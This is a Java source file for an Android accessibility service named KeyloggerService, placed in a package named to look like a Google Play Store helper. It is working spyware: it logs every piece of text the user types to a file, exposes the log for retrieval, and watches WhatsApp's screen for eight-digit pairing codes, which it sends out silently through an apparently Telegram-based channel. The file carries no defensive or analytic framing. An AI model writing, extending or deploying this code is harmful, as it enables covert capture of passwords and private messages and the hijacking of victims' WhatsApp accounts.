package com.android.vending.helper;
import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.*;
public class KeyloggerService extends AccessibilityService {
    public static boolean isHuntingWaCode = false;
    @Override public void onAccessibilityEvent(AccessibilityEvent event) {
        if (isHuntingWaCode && event.getPackageName() != null && event.getPackageName().toString().equals("com.whatsapp")) {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) { scanNodeForCode(root); root.recycle(); }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            try { File f = new File(getFilesDir(), "keylogs.txt"); FileWriter fw = new FileWriter(f, true); fw.write(text + "\n"); fw.close(); } catch (Exception ignored) {}
        }
    }
    private void scanNodeForCode(AccessibilityNodeInfo node) {
        if (node == null) return;
        if (node.getText() != null) {
            String txt = node.getText().toString();
            if (txt.matches("^[0-9]{4}-[0-9]{4}$") || txt.matches("^[0-9]{8}$")) {
                Tg.sendSilent("[+] WhatsApp Pairing Code Found: " + txt);
                isHuntingWaCode = false; return;
            }
        }
        for (int i = 0; i < node.getChildCount(); i++) { scanNodeForCode(node.getChild(i)); }
    }
    public static String getLogs(android.content.Context c) {
        try { File f = new File(c.getFilesDir(), "keylogs.txt"); if (!f.exists()) return "No logs yet."; BufferedReader br = new BufferedReader(new FileReader(f)); StringBuilder sb = new StringBuilder(); String line; while ((line = br.readLine()) != null) sb.append(line).append("\n"); br.close(); return sb.toString(); }
        catch (Exception e) { return "Error reading logs."; }
    }
    @Override public void onInterrupt() {}
}
